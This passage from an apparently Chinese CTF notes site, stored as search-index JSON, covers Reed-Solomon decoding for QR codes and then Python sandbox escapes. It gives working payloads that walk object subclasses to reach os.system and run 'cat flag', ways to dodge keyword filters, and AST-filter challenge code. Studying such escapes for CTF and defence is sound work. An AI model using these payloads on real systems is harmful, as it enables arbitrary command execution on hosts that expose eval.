}Y_{k}X_{k}^{j}\\right)=0\\] <p>\u6839\u636e\u5178\u578b\u503c\u7684\u5b9a\u4e49\u6709\uff1a</p> \\[S_{j+\\nu}+\\Lambda_1S_{j+\\nu-1}+\\cdots+\\Lambda_\\nu S_k=0\\] <p>\u628a \\(S_{j+\\nu}\\) \u79fb\u5230\u53f3\u8fb9\uff0c\u5e76\u5c55\u5f00\u6240\u6709 \\(j\\) \u53ef\u4ee5\u5f97\u5230\u77e9\u9635\u5f62\u5f0f\uff1a</p> \\[\\begin{bmatrix} S_{0}&amp;S_{1}&amp;\\cdots &amp;S_{\\nu-1}\\\\\\\\S_{1}&amp;S_{2}&amp;\\cdots &amp;S_{\\nu}\\\\\\\\\\vdots &amp;\\vdots &amp;&amp;\\vdots \\\\\\\\S_{\\nu-1}&amp;S_{\\nu}&amp;\\cdots &amp;S_{2\\nu -2} \\end{bmatrix} \\begin{bmatrix}\\Lambda _{\\nu }\\\\\\\\\\Lambda _{\\nu -1}\\\\\\\\\\vdots \\\\\\\\\\Lambda _{1} \\end{bmatrix} = \\begin{bmatrix} -S_{\\nu}\\\\\\\\-S_{\\nu +1}\\\\\\\\\\vdots \\\\\\\\-S_{2\\nu-1 } \\end{bmatrix}\\] <p>\u6b64\u65f6\u662f\u4e00\u4e2a\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff0c\u800c\u4e14 \\(S_i\\) \u5168\u90e8\u5df2\u77e5\uff0c\u53ef\u4ee5\u89e3\u5f97 \\(\\Lambda_i\\)</p>"},{"location":"ctf/misc/qrcode/#_9","title":"\u5f97\u5230\u9519\u8bef\u4f4d\u7f6e\u548c\u5927\u5c0f","text":"<p>\u6b64\u65f6\u591a\u9879\u5f0f \\(\\Lambda(x)\\)  \u5df2\u7ecf\u5b8c\u5168\u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u6c42\u5f97\u5176\u6839\uff08\u7528 Chien search \u7b97\u6cd5\u5728\u4f3d\u7f57\u74e6\u57df\u4e0a\u6c42\u6839\uff09</p> <p>\u518d\u7b97\u5176\u5012\u6570\u5373\u53ef\u5f97\u5230 \\(X_k\\) \uff0c\u7136\u540e\u53ef\u4ee5\u5bfb\u627e\u5230\u9519\u8bef\u4f4d\u7f6e \\(i_k\\)</p> <p>\u8fd9\u65f6\u4e5f\u5c31\u53ef\u4ee5\u5e26\u5165\u7b2c\u4e00\u4e2a\u65b9\u7a0b\u7ec4\u6c42\u5f97\u9519\u8bef\u5927\u5c0f \\(Y_k\\)\uff08\u6216\u8005\u5229\u7528 Forney algorithm\uff09</p> <p>\u5f97\u5230\u4e86 \\(e(x)\\) \u540e\u5c31\u53ef\u4ee5\u6839\u636e \\(r(x)\\) \u7b97\u51fa\u539f\u59cb\u4fe1\u606f \\(s(x)\\) \u4e86</p>"},{"location":"ctf/misc/escapes/","title":"\u6c99\u7bb1\u9003\u9038","text":"<p>In computer security, a sandbox is a security mechanism for separating running programs, usually in an effort to mitigate system failures and/or software vulnerabilities from spreading. It is often used to execute untested or untrusted programs or code, possibly from unverified or untrusted third parties, suppliers, users or websites, without risking harm to the host machine or operating system. A sandbox typically provides a tightly controlled set of resources for guest programs to run in, such as storage and memory scratch space. \u2014\u2014\u2014\u2014 Wikipedia</p> <p>Abstract</p> <p>CTF \u4e2d\u6709\u4e00\u4e9b\u9898\u76ee\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u6c99\u7bb1\u6765\u8fd0\u884c\u4f60\u7684\u4ee3\u7801\uff0c\u9700\u8981\u9003\u9038\u51fa\u8fd9\u4e2a\u6c99\u7bb1\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u83b7\u53d6\u670d\u52a1\u5668\u4e2d\u5b58\u50a8\u7684 flag</p> <p>\u8fd9\u91cc\u5199\u4e00\u4e9b\u5e38\u89c1\u7684\u901a\u7528\u7684\u6c99\u7bb1\u9003\u9038\u65b9\u6cd5</p>"},{"location":"ctf/misc/escapes/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Python \u6c99\u7bb1\u9003\u9038</li> </ul>"},{"location":"ctf/misc/escapes/pysandbox/","title":"Python \u6c99\u7bb1\u9003\u9038","text":"<p> \u7ea6 1632 \u4e2a\u5b57  617 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p>"},{"location":"ctf/misc/escapes/pysandbox/#_1","title":"\u4e3a\u4ec0\u4e48\u9003\u9038\uff1f","text":"<p>Python \u91cc\u7684 <code>eval</code> \u548c <code>exec</code> \u53ef\u4ee5\u7528\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u5e72\u574f\u4e8b \u4f46\u662f\u9898\u76ee\u90fd\u4f1a\u7ed9\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u3001\u770b\u8d77\u6765\u4e25\u5bc6\u7684\u9650\u5236\u9632\u6b62\u5e72\u574f\u4e8b \u8fd9\u65f6\u5019\u5c31\u8981\u627e\u65b9\u6cd5\u7ed5\u8fc7\u9650\u5236\u6765\u5e72\u574f\u4e8b\uff0c\u4e5f\u5c31\u662f\u6c99\u7bb1\u9003\u9038</p>"},{"location":"ctf/misc/escapes/pysandbox/#eval-exec","title":"eval \u548c exec \u6709\u4ec0\u4e48\u533a\u522b","text":"<pre><code>eval(expression[, globals[, locals]])\nexec(expression[, globals[, locals]])\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u5b83\u4eec\u7684\u7528\u6cd5\u5927\u4f53\u76f8\u4f3c\uff0c\u53c2\u6570\u6709\u8981\u6267\u884c\u7684\u8868\u8fbe\u5f0f <code>expression</code>\uff0c\u5168\u5c40\u53d8\u91cf <code>globals</code>\uff08\u5fc5\u987b\u662f\u5b57\u5178\uff09\uff0c\u5c40\u90e8\u53d8\u91cf <code>locals</code>\uff08\u4efb\u610f mapping object\uff0c\u4e00\u822c\u4e5f\u662f\u5b57\u5178\uff09</p> <p>\u4e0d\u540c\u7684\u662f <code>eval</code> \u628a\u8868\u8fbe\u5f0f\u8ba1\u7b97\u51fa\u6765\uff0c\u628a\u7ed3\u679c\u8fd4\u56de\uff0c\u5e76\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d\u73af\u5883 \u800c <code>exec</code> \u628a\u8868\u8fbe\u5f0f\u4f5c\u4e3apy\u8bed\u53e5\u6765\u6267\u884c\uff0c\u53ef\u4ee5\u8fdb\u884c\u8d4b\u503c\u7b49\u64cd\u4f5c\uff08\u9898\u76ee\u91cc <code>exec</code> \u4e0d\u5e38\u89c1\uff09</p>"},{"location":"ctf/misc/escapes/pysandbox/#eval-exec_1","title":"eval \u548c exec \u5982\u4f55\u6784\u9020\u6c99\u7bb1","text":"<p>\u53ef\u4ee5\u770b\u51fa\uff0ceval \u548c exec \u90fd\u5305\u542b\u53c2\u6570 globals locals\uff0c\u53ef\u4ee5\u6307\u5b9a\u5b83\u4eec\u4e3a\u7a7a\u5b57\u5178\u4f7f\u5176\u8bbf\u95ee\u4e0d\u5230\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf</p> <p>\u800c\u6bd4\u8f83\u7279\u522b\u7684\u5c31\u662f <code>__builtins__</code> \uff0c\u5373\u5185\u7f6e\u51fd\u6570\u3002\u5982\u679c globals \u4e2d\u6ca1\u6709\u952e builtins \uff0c\u5219\u4f1a\u81ea\u52a8\u5c06\u5176\u63d2\u5165\uff0c\u800c\u770b\u6587\u6863 https://docs.python.org/3/library/functions.html \u53ef\u4ee5\u53d1\u73b0\u5176\u4e2d\u6709\u51fd\u6570 <code>open</code> \u548c <code>__import__</code> \u53ef\u4ee5\u7528\u6765\u5e72\u574f\u4e8b\uff0c\u6240\u4ee5\u4e00\u822c\u4f1a\u4f20\u5165 globals \u4e3a <code>{'__builtins__': {}}</code> \u4f7f\u5176\u65e0\u6cd5\u4f7f\u7528\u5185\u7f6e\u51fd\u6570</p>"},{"location":"ctf/misc/escapes/pysandbox/#astliteral_eval","title":"ast.literal_eval","text":"<p>\u5373\u4f7f eval \u548c exec \u7ed9\u4e86\u8fd9\u6837\u7684\u9650\u5236\uff0c\u90a3\u80af\u5b9a\u8fd8\u662f\u4f1a\u6709\u6f0f\u6d1e\u7684\uff08\u4e0d\u7136\u5c31\u6ca1\u8fd9\u7bc7\u6587\u7ae0\u4e86\uff09 \u90a3\u6709\u6ca1\u6709\u66f4\u5b89\u5168\u7684 eval\uff1f</p> <p><code>ast</code> \u6a21\u5757\u4e2d\u7684 <code>literal_eval</code> \u5c31\u4f1a\u66f4\u52a0\u5b89\u5168\uff0c\u76ee\u524d\u8c8c\u4f3c\u5e76\u65e0\u7a81\u7834\u65b9\u6cd5\uff0c\u6240\u4ee5\u9898\u76ee\u91cc\u662f <code>ast.literal_eval</code> \u57fa\u672c\u4e0a\u5c31\u4e0d\u662f\u6c99\u7bb1\u9003\u9038\u4e86_(:\u0437\u300d\u2220)_</p>"},{"location":"ctf/misc/escapes/pysandbox/#_2","title":"\u600e\u4e48\u9003\u9038\uff1f","text":""},{"location":"ctf/misc/escapes/pysandbox/#expression-eval","title":"\u4ec5\u68c0\u67e5\u4e86 expression\uff0c\u4f46 eval \u6ca1\u6709\u9650\u5236","text":"<p>\u8fd9\u65f6\u53ea\u8981\u7ed5\u8fc7 expression \u7684\u9650\u5236\u5c31\u53ef\u4ee5\u4e86 \u6bd4\u5982\u8fc7\u6ee4\u4e86 <code>system\u3001open\u3001ls\u3001cat</code> \u7b49\u654f\u611f\u8bcd \u8fd9\u6837\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u6216\u8005\u628a bytes decode \u6210\u5b57\u7b26\u4e32\u6765\u7ed5\u8fc7 \u4e5f\u53ef\u4ee5\u7528\u73b0\u6709\u5b57\u7b26\u4e32\uff08<code>?.__doc__</code>\uff09\u901a\u8fc7\u7d22\u5f15\u6765\u62fc\u63a5\u6210\u9700\u8981\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u662f\u8fc7\u6ee4\u4e86\u6570\u5b57\u7684\u8bdd\u5219\u53ef\u4ee5\u7528 <code>True\u3001False</code> \uff08\u6216 <code>[]==[]\u3001[]&lt;[]</code>\uff09\u6765\u52a0\u51cf\u4e58\u9664\u5f00\u65b9\u79fb\u4f4d\u5f97\u5230\u6570\u5b57</p>"},{"location":"ctf/misc/escapes/pysandbox/#import","title":"\u6ca1\u6709 import","text":"<p>\u53ef\u4ee5\u7528 <code>__import__</code> \u6765\u624b\u52a8 import\uff0c\u5177\u4f53\uff1a<code>__import__(package)</code>  \u5f97\u5230\u7684\u5c31\u662f\u8fd9\u4e2apackage\u3001\u6216\u8005\u7528 <code>importlib.import_module</code> \u6765\u5bfc\u5165\u4e00\u4e2a\u5305</p> <pre><code>__import__(os).system(\"cat flag\")\nimportlib.import_module(\"os\"); os.system(\"cat flag\")\n</code></pre>"},{"location":"ctf/misc/escapes/pysandbox/#__builtins__","title":"\u4ec5\u6e05\u7a7a\u4e86 __builtins__","text":"<p>\u53ef\u4ee5\u5c1d\u8bd5\u7528 <code>imp.reload</code> \u6216 <code>importlib.reload</code> \u6765\u91cd\u65b0\u5bfc\u5165 <code>__builtins__</code> </p>"},{"location":"ctf/misc/escapes/pysandbox/#eval","title":"eval \u628a\u73af\u5883\u6e05\u7a7a\u4e86","text":""},{"location":"ctf/misc/escapes/pysandbox/#object","title":"\u627e object \u7684\u5b50\u7c7b","text":"<p>python \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7\u4efb\u610f\u4e1c\u897f\u6765\u627e\u5230 object \u8fd9\u4e2a\u7c7b\uff1a</p> <pre><code>[].__class__.__base__\n[].__class__.__bases__[0]\n[].__class__.__mro__[-1]\n().__class__.__base__\n...\n{}....\n''....\n...\n</code></pre> <p>\u7136\u540e\u83b7\u53d6\u5b83\u7684\u5b50\u7c7b\uff1a</p> <pre><code>[].__class__.__base__.__subclasses__()\n</code></pre> subclasses <pre><code>(0, &lt;class 'type'&gt;)\n(1, &lt;class 'weakref'&gt;)\n(2, &lt;class 'weakcallableproxy'&gt;)\n(3, &lt;class 'weakproxy'&gt;)\n(4, &lt;class 'int'&gt;)\n(5, &lt;class 'bytearray'&gt;)\n(6, &lt;class 'bytes'&gt;)\n(7, &lt;class 'list'&gt;)\n(8, &lt;class 'NoneType'&gt;)\n(9, &lt;class 'NotImplementedType'&gt;)\n(10, &lt;class 'traceback'&gt;)\n(11, &lt;class 'super'&gt;)\n(12, &lt;class 'range'&gt;)\n(13, &lt;class 'dict'&gt;)\n(14, &lt;class 'dict_keys'&gt;)\n(15, &lt;class 'dict_values'&gt;)\n(16, &lt;class 'dict_items'&gt;)\n(17, &lt;class 'dict_reversekeyiterator'&gt;)\n(18, &lt;class 'dict_reversevalueiterator'&gt;)\n(19, &lt;class 'dict_reverseitemiterator'&gt;)\n(20, &lt;class 'odict_iterator'&gt;)\n(21, &lt;class 'set'&gt;)\n(22, &lt;class 'str'&gt;)\n(23, &lt;class 'slice'&gt;)\n(24, &lt;class 'staticmethod'&gt;)\n(25, &lt;class 'complex'&gt;)\n(26, &lt;class 'float'&gt;)\n(27, &lt;class 'frozenset'&gt;)\n(28, &lt;class 'property'&gt;)\n(29, &lt;class 'managedbuffer'&gt;)\n(30, &lt;class 'memoryview'&gt;)\n(31, &lt;class 'tuple'&gt;)\n(32, &lt;class 'enumerate'&gt;)\n(33, &lt;class 'reversed'&gt;)\n(34, &lt;class 'stderrprinter'&gt;)\n(35, &lt;class 'code'&gt;)\n(36, &lt;class 'frame'&gt;)\n(37, &lt;class 'builtin_function_or_method'&gt;)\n(38, &lt;class 'method'&gt;)\n(39, &lt;class 'function'&gt;)\n(40, &lt;class 'mappingproxy'&gt;)\n(41, &lt;class 'generator'&gt;)\n(42, &lt;class 'getset_descriptor'&gt;)\n(43, &lt;class 'wrapper_descriptor'&gt;)\n(44, &lt;class 'method-wrapper'&gt;)\n(45, &lt;class 'ellipsis'&gt;)\n(46, &lt;class 'member_descriptor'&gt;)\n(47, &lt;class 'types.SimpleNamespace'&gt;)\n(48, &lt;class 'PyCapsule'&gt;)\n(49, &lt;class 'longrange_iterator'&gt;)\n(50, &lt;class 'cell'&gt;)\n(51, &lt;class 'instancemethod'&gt;)\n(52, &lt;class 'classmethod_descriptor'&gt;)\n(53, &lt;class 'method_descriptor'&gt;)\n(54, &lt;class 'callable_iterator'&gt;)\n(55, &lt;class 'iterator'&gt;)\n(56, &lt;class 'pickle.PickleBuffer'&gt;)\n(57, &lt;class 'coroutine'&gt;)\n(58, &lt;class 'coroutine_wrapper'&gt;)\n(59, &lt;class 'InterpreterID'&gt;)\n(60, &lt;class 'EncodingMap'&gt;)\n(61, &lt;class 'fieldnameiterator'&gt;)\n(62, &lt;class 'formatteriterator'&gt;)\n(63, &lt;class 'BaseException'&gt;)\n(64, &lt;class 'hamt'&gt;)\n(65, &lt;class 'hamt_array_node'&gt;)\n(66, &lt;class 'hamt_bitmap_node'&gt;)\n(67, &lt;class 'hamt_collision_node'&gt;)\n(68, &lt;class 'keys'&gt;)\n(69, &lt;class 'values'&gt;)\n(70, &lt;class 'items'&gt;)\n(71, &lt;class 'Context'&gt;)\n(72, &lt;class 'ContextVar'&gt;)\n(73, &lt;class 'Token'&gt;)\n(74, &lt;class 'Token.MISSING'&gt;)\n(75, &lt;class 'moduledef'&gt;)\n(76, &lt;class 'module'&gt;)\n(77, &lt;class 'filter'&gt;)\n(78, &lt;class 'map'&gt;)\n(79, &lt;class 'zip'&gt;)\n(80, &lt;class '_frozen_importlib._ModuleLock'&gt;)\n(81, &lt;class '_frozen_importlib._DummyModuleLock'&gt;)\n(82, &lt;class '_frozen_importlib._ModuleLockManager'&gt;)\n(83, &lt;class '_frozen_importlib.ModuleSpec'&gt;)\n(84, &lt;class '_frozen_importlib.BuiltinImporter'&gt;)\n(85, &lt;class 'classmethod'&gt;)\n(86, &lt;class '_frozen_importlib.FrozenImporter'&gt;)\n(87, &lt;class '_frozen_importlib._ImportLockContext'&gt;)\n(88, &lt;class '_thread._localdummy'&gt;)\n(89, &lt;class '_thread._local'&gt;)\n(90, &lt;class '_thread.lock'&gt;)\n(91, &lt;class '_thread.RLock'&gt;)\n(92, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;)\n(93, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;)\n(94, &lt;class '_frozen_importlib_external.FileLoader'&gt;)\n(95, &lt;class '_frozen_importlib_external._NamespacePath'&gt;)\n(96, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;)\n(97, &lt;class '_frozen_importlib_external.PathFinder'&gt;)\n(98, &lt;class '_frozen_importlib_external.FileFinder'&gt;)\n(99, &lt;class '_io._IOBase'&gt;)\n(100, &lt;class '_io._BytesIOBuffer'&gt;)\n(101, &lt;class '_io.IncrementalNewlineDecoder'&gt;)\n(102, &lt;class 'posix.ScandirIterator'&gt;)\n(103, &lt;class 'posix.DirEntry'&gt;)\n(104, &lt;class 'zipimport.zipimporter'&gt;)\n(105, &lt;class 'zipimport._ZipImportResourceReader'&gt;)\n(106, &lt;class 'codecs.Codec'&gt;)\n(107, &lt;class 'codecs.IncrementalEncoder'&gt;)\n(108, &lt;class 'codecs.IncrementalDecoder'&gt;)\n(109, &lt;class 'codecs.StreamReaderWriter'&gt;)\n(110, &lt;class 'codecs.StreamRecoder'&gt;)\n(111, &lt;class '_abc_data'&gt;)\n(112, &lt;class 'abc.ABC'&gt;)\n(113, &lt;class 'dict_itemiterator'&gt;)\n(114, &lt;class 'collections.abc.Hashable'&gt;)\n(115, &lt;class 'collections.abc.Awaitable'&gt;)\n(116, &lt;class 'collections.abc.AsyncIterable'&gt;)\n(117, &lt;class 'async_generator'&gt;)\n(118, &lt;class 'collections.abc.Iterable'&gt;)\n(119, &lt;class 'bytes_iterator'&gt;)\n(120, &lt;class 'bytearray_iterator'&gt;)\n(121, &lt;class 'dict_keyiterator'&gt;)\n(122, &lt;class 'dict_valueiterator'&gt;)\n(123, &lt;class 'list_iterator'&gt;)\n(124, &lt;class 'list_reverseiterator'&gt;)\n(125, &lt;class 'range_iterator'&gt;)\n(126, &lt;class 'set_iterator'&gt;)\n(127, &lt;class 'str_iterator'&gt;)\n(128, &lt;class 'tuple_iterator'&gt;)\n(129, &lt;class 'collections.abc.Sized'&gt;)\n(130, &lt;class 'collections.abc.Container'&gt;)\n(131, &lt;class 'collections.abc.Callable'&gt;)\n(132, &lt;class 'os._wrap_close'&gt;)\n(133, &lt;class '_sitebuiltins.Quitter'&gt;)\n(134, &lt;class '_sitebuiltins._Printer'&gt;)\n(135, &lt;class '_sitebuiltins._Helper'&gt;)\n(136, &lt;class 'types.DynamicClassAttribute'&gt;)\n(137, &lt;class 'types._GeneratorWrapper'&gt;)\n(138, &lt;class 'warnings.WarningMessage'&gt;)\n(139, &lt;class 'warnings.catch_warnings'&gt;)\n(140, &lt;class 'importlib.abc.Finder'&gt;)\n(141, &lt;class 'importlib.abc.Loader'&gt;)\n(142, &lt;class 'importlib.abc.ResourceReader'&gt;)\n(143, &lt;class 'operator.itemgetter'&gt;)\n(144, &lt;class 'operator.attrgetter'&gt;)\n(145, &lt;class 'operator.methodcaller'&gt;)\n(146, &lt;class 'itertools.accumulate'&gt;)\n(147, &lt;class 'itertools.combinations'&gt;)\n(148, &lt;class 'itertools.combinations_with_replacement'&gt;)\n(149, &lt;class 'itertools.cycle'&gt;)\n(150, &lt;class 'itertools.dropwhile'&gt;)\n(151, &lt;class 'itertools.takewhile'&gt;)\n(152, &lt;class 'itertools.islice'&gt;)\n(153, &lt;class 'itertools.starmap'&gt;)\n(154, &lt;class 'itertools.chain'&gt;)\n(155, &lt;class 'itertools.compress'&gt;)\n(156, &lt;class 'itertools.filterfalse'&gt;)\n(157, &lt;class 'itertools.count'&gt;)\n(158, &lt;class 'itertools.zip_longest'&gt;)\n(159, &lt;class 'itertools.permutations'&gt;)\n(160, &lt;class 'itertools.product'&gt;)\n(161, &lt;class 'itertools.repeat'&gt;)\n(162, &lt;class 'itertools.groupby'&gt;)\n(163, &lt;class 'itertools._grouper'&gt;)\n(164, &lt;class 'itertools._tee'&gt;)\n(165, &lt;class 'itertools._tee_dataobject'&gt;)\n(166, &lt;class 'reprlib.Repr'&gt;)\n(167, &lt;class 'collections.deque'&gt;)\n(168, &lt;class '_collections._deque_iterator'&gt;)\n(169, &lt;class '_collections._deque_reverse_iterator'&gt;)\n(170, &lt;class '_collections._tuplegetter'&gt;)\n(171, &lt;class 'collections._Link'&gt;)\n(172, &lt;class 'functools.partial'&gt;)\n(173, &lt;class 'functools._lru_cache_wrapper'&gt;)\n(174, &lt;class 'functools.partialmethod'&gt;)\n(175, &lt;class 'functools.singledispatchmethod'&gt;)\n(176, &lt;class 'functools.cached_property'&gt;)\n(177, &lt;class 'contextlib.ContextDecorator'&gt;)\n(178, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;)\n(179, &lt;class 'contextlib._BaseExitStack'&gt;)\n(180, &lt;class 'rlcompleter.Completer'&gt;)\n</code></pre>"},{"location":"ctf/misc/escapes/pysandbox/#_3","title":"\u641e\u4e8b","text":"<p>\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u67d0\u4e9b\u7c7b\u7684 <code>__init__</code> \u91cc\u9762\u641e\u5230 <code>__globals__</code> \uff0c\u6bd4\u5982\uff1a</p> <pre><code>[].__class__.__base__.__subclasses__()[-2].__init__.__globals__['sys'].modules['os'].system(\"cat flag\")\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u5229\u7528\u5b50\u7c7b\u91cc\u9762\u7684\u5371\u9669\u7c7b\uff1a</p> <pre><code>(37, &lt;class 'builtin_function_or_method'&gt;)\n(94, &lt;class '_frozen_importlib_external.FileLoader'&gt;)\n(132, &lt;class 'os._wrap_close'&gt;)\n</code></pre> <p>\u6bd4\u5982\uff1a</p> <pre><code>[].__class__.__base__.__subclasses__()[94].get_data(\"\", \"flag\")\n[].__class__.__base__.__subclasses__()[132].close.__globals__[\"system\"](\"cat flag\")\n</code></pre> <p>python2 \u91cc\u8fd8\u6709 file \u53ef\u4ee5\u76f4\u63a5 open</p>"},{"location":"ctf/misc/escapes/pysandbox/#ast","title":"\u7ed5\u8fc7 AST \u68c0\u6d4b","text":"<p>\u5177\u4f53\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u5217\u51fa\u4e00\u6761\uff0c\u89c1\u4e0b\u9762</p>"},{"location":"ctf/misc/escapes/pysandbox/#ast_1","title":"\u7ed5\u8fc7 AST \u68c0\u6d4b\u9003\u9038","text":"<p>\u8fd9\u7c7b\u9898\u76ee\u4e0d\u50cf\u666e\u901a\u7684\u6c99\u7bb1\u9003\u9038\u4e00\u6837\u901a\u8fc7\u5220\u9664\u5185\u7f6e\u51fd\u6570\u5b57\u5178\u6216\u8005\u5220\u9664\u67d0\u4e9b\u6a21\u5757\u7684\u5185\u5bb9\u6765\u5b9e\u73b0 \u800c\u662f\u5728\u8f93\u5165\u547d\u4ee4\u540e\u5373\u4f7f\u7528python\u7684 ast \u6a21\u5757\u5bf9\u5176\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff0c\u53ea\u8981\u4f7f\u7528\u4e86\u67d0\u4e9b\u7981\u6b62\u7684\u62bd\u8c61\u8bed\u6cd5\uff0c\u5c31\u629b\u51fa\u5f02\u5e38\u5bfc\u81f4\u7a0b\u5e8f\u4e2d\u65ad \u56e0\u4e3a\u5b83\u76f4\u63a5\u4f7f\u7528 ast.parse \u5206\u6790\u4e86\u8bed\u6cd5\uff0c\u6240\u4ee5\u5f88\u96be\u8499\u6df7\u8fc7\u5173\u9a97\u8fc7 ast\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u5bfb\u627e\u9898\u76ee\u4e2d\u904d\u5386\u8bed\u6cd5\u6811\u7684\u6f0f\u6d1e\u4e86</p> <p>\u5148\u6765\u770b\u770b cy \u7684 pysandbox13\uff0c\u8fd9\u4e2a\u6700\u7ec8\u7248\u7684 AST \u68c0\u67e5\u7ed5\u8fc7</p> \u9898\u76ee\u4ee3\u7801 <pre><code>dbgprint = sys.stderr.write\n\nclass Traversal():\n    def __init__(self, node):\n        self.tisiv(node)\n\n    depth = -1\n    def tisiv(self, nodes):\n        if not isinstance(nodes, list):\n            nodes = [nodes]\n        self.depth += 1\n        for node in nodes:\n            func = getattr(self, 'tisiv_' + node.__class__.__name__, None)\n            if func:\n                dbgprint(\" \"*self.depth + \"tisiv\"[::-1] +\"\\t\"+ node.__class__.__name__+\"\\n\")\n                return func(node)\n            else:\n                if not isinstance(node, ast.expr):\n                    raise Exception(\"not allowed \"+str(node))\n        self.depth -= 1\n\n    def tisiv_Call(self, node):\n        raise Exception(\"not allowed\")\n        self.tisiv(node.func)\n        self.tisiv(node.args)\n        self.tisiv(node.keywords)\n\n    def tisiv_Attribute(self, node):\n        raise Exception(\"not allowed\")\n        self.tisiv(node.value)\n        self.tisiv(node.attr)\n        self.tisiv(node.ctx)\n\n    def tisiv_Import(self, node):\n        raise Exception(\"not allowed\")\n\n    def tisiv_Module(self, node):\n        self.tisiv(node.body)\n\n    def tisiv_BoolOp(self, node):\n        self.tisiv(node.values)\n\n    def tisiv_BinOp(self, node):\n        self.tisiv(node.left)\n        self.tisiv(node.right)\n\n    def tisiv_UnaryOp(self, node):\n        self.tisiv(node.operand)\n\n    def tisiv_Lambda(self, node):\n        self.tisiv(node.body)\n        self.tisiv(node.args)\n\n    def tisiv_IfExp(self, node):\n        self.tisiv(node.test)\n        self.tisiv(node.body)\n        self.tisiv(node.orelse)\n\n    def tisiv_Dict(self, node):\n        self.tisiv(node.keys)\n        self.tisiv(node.values)\n\n    def tisiv_Set(self, node):\n        self.tisiv(node.elts)\n\n    def tisiv_ListComp(self, node):\n        self.tisiv(node.elt)\n        self.tisiv(node.generators)\n\n    def tisiv_SetComp(self, node):\n        self.tisiv(node.elt)\n        self.tisiv(node.generators)\n\n    def tisiv_DictComp(self, node):\n        self.tisiv(node.key)\n        self.tisiv(node.value)\n        self.tisiv(node.generators)\n\n    def tisiv_GeneratorExp(self, node):\n        self.tisiv(node.elt)\n        self.tisiv(node.generators)\n\n    def tisiv_Yield(self, node):\n        self.tisiv(node.value)\n\n    def tisiv_Compare(self, node):\n        self.tisiv(node.left)\n        self.tisiv(node.comparators)\n\n    def tisiv_Repr(self, node):\n        self.tisiv(node.value)\n\n    def tisiv_Subscript(self, node):\n        self.tisiv(node.value)\n        self.tisiv(node.slice)\n\n    def tisiv_List(self, node):\n        self.tisiv(node.elts)\n\n    def tisiv_Tuple(self, node):\n        self.tisiv(node.elts)\n\n    def tisiv_Expr(self, node):\n        self.tisiv(node.value)\n\n    def tisiv_JoinedStr(self, node):\n        self.tisiv(node.values)\n\n    def tisiv_NameConstant(self, node):\n        pass\n\nTraversal(ast.parse(c))\n</code></pre> <p>\u53ef\u4ee5\u8bfb\u51fa\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a Traversal \u7c7b\uff0c\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u5bf9\u4f20\u5165\u7684\u8282\u70b9\u8c03\u7528 tisiv \u65b9\u6cd5\uff0c\u5373\u5bf9\u5176\u6240\u6709\u5b50\u8282\u70b9\u7ee7\u7eed\u9010\u5c42\u68c0\u67e5 \u5982\u679c tisiv_{\u8be5\u8282\u70b9\u7c7b\u540d} \u5df2\u7ecf\u6709\u4e86\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u5c31\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u4e9b\u65b9\u6cd5\u4e2d\u53c8\u5206\u522b\u5bf9\u5176\u5b50\u8282\u70b9\u8fdb\u884c\u4e86\u68c0\u67e5 \u5982\u679c\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u65b9\u6cd5\uff0c\u5c31\u68c0\u6d4b\u8fd9\u4e2a\u8282\u70b9\u7684\u8bed\u6cd5\u7c7b\u578b\u662f\u4e0d\u662f ast.expr\uff0c\u5982\u679c\u4e0d\u662f\u5c31\u76f4\u63a5\u7981\u6b62</p> <p>\u518d\u770b TokyoWesterns CTF 4th 2018 \u7684\u4e00\u9053\u9898\uff1a</p> \u9898\u76ee\u4ee3\u7801 <pre><code>def check(node):\n    if isinstance(node, list):\n        return all([check(n) for n in node])\n    else:\n        attributes = {\n            'BoolOp': ['values'],\n            'BinOp': ['left', 'right'],\n            'UnaryOp': ['operand'],\n            'Lambda': ['body'],\n            'IfExp': ['test', 'body', 'orelse'],\n            'Dict': ['keys', 'values'],\n            'Set': ['elts'],\n            'ListComp': ['elt', 'generators'],\n            'SetComp': ['elt', 'generators'],\n            'DictComp': ['key', 'value', 'generators'],\n            'GeneratorExp': ['elt', 'generators'],\n            'Yield': ['value'],\n            'Compare': ['left', 'comparators'],\n            'Call': False, # call is not permitted\n            'Repr': ['value'],\n            'Num': True,\n            'Str': True,\n            'Attribute': False, # attribute is also not permitted\n            'Subscript': ['value'],\n            'Name': True,\n            'List': ['elts'],\n            'Tuple': ['elts'],\n            'Expr': ['value'], # root node \n            'comprehension': ['target', 'iter', 'ifs'],\n        }\n\n        for k, v in attributes.items():\n            if hasattr(ast, k) and isinstance(node, getattr(ast, k)):\n                if isinstance(v, bool):\n                    return v\n                return all([check(getattr(node, attr)) for attr in v])\n\nif __name__ == '__main__':\n    expr = sys.stdin.readline()\n    body = ast.parse(expr).body\n</code></pre> 